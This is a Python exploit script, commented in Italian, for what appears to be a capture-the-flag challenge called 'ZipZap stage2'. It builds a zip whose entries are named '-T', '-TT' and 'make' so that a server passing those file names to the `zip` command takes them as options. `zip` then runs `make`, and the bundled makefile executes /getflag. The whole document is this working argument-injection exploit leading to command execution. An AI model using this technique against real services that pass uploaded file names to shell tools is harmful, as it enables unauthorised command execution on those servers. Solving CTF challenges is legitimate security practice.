#!/usr/bin/env python3
import argparse
import io
import zipfile


def build_payload_zip(output_file: str) -> bytes:
    """
    Crea lo zip malevolo da caricare sulla challenge.

    Idea base:
    - il server passa i nomi file al comando `zip`
    - se un nome inizia con '-', zip lo interpreta come opzione
    - noi inseriamo i file '-T', '-TT' e 'make'
    - risultato finale: zip esegue `make` come comando di test
    """

    # Regola make volutamente robusta: esegue sempre /getflag per qualunque target
    # che zip passi a make (anche se il target esiste gia').
    makefile = (
        ".PHONY: $(MAKECMDGOALS)\n"
        "$(MAKECMDGOALS):\n"
        f"\t/getflag > {output_file}\n"
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        zf.writestr("-T", b"")
        zf.writestr("-TT", b"")
        zf.writestr("make", b"")
        zf.writestr("makefile", makefile.encode())

    return buf.getvalue()


def main() -> None:
    parser = argparse.ArgumentParser(description="Genera zip exploit per ZipZap stage2")
    parser.add_argument("-o", "--output-zip", default="payload.zip", help="Nome zip da generare")
    parser.add_argument("-f", "--flag-file", default="flag.txt", help="File che conterra' output di /getflag")
    args = parser.parse_args()

    payload = build_payload_zip(args.flag_file)
    with open(args.output_zip, "wb") as fp:
        fp.write(payload)

    print(f"[+] Zip creato: {args.output_zip}")
    print("[+] Contiene i file: -T, -TT, make, makefile")
    print(f"[+] Dopo il trigger scarica: {args.flag_file}")


if __name__ == "__main__":
    main()
